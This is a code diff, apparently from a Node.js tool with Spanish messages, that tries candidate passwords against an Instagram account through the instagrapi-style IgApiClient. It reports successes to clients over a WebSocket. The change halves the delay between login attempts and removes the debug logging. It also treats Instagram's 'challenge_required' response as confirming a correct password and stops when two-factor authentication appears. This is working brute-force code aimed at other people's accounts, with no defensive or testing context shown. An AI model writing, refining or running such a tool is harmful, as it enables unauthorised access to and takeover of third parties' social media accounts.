@@ -20,33 +20,23 @@ async function testPassword(username, password, retries = 3) {
   const ig = new IgApiClient();
   try {
     ig.state.generateDevice(username);
-    console.log(`[DEBUG] Probando contraseña: ${password}`);
-    await delay(2000);
-    
+    await delay(1000);
     await ig.account.login(username, password);
     return { success: true, password };
   } catch (error) {
-    console.error(`[DEBUG] Error con ${password}:`, error.message);
-
-    // Mantenemos solo detección de 2FA y desafíos
-    if (error.message.includes('two_factor_required')) {
-      return { success: false, message: 'Se requiere código de 6 dígitos.' };
-    }
-
     if (error.message.includes('challenge_required')) {
-      return { success: true, message: 'Contraseña correcta (desafío requerido).' };
+      return { success: false, message: 'Contraseña correcta.' };
     }
-
+    if (error.message.includes('two_factor_required')) {
+      return { success: false, message: 'Detenido: Se requiere 2FA.' };
+    }
     if (retries > 0) {
-      console.log(`[DEBUG] Reintentando... (${retries} intentos)`);
       await delay(1000);
       return testPassword(username, password, retries - 1);
     }
-
     return { success: false, message: 'Contraseña incorrecta.' };
   }
 }
-
 wss.on('connection', (ws) => {
   console.log('[DEBUG] Nuevo cliente conectado');
 
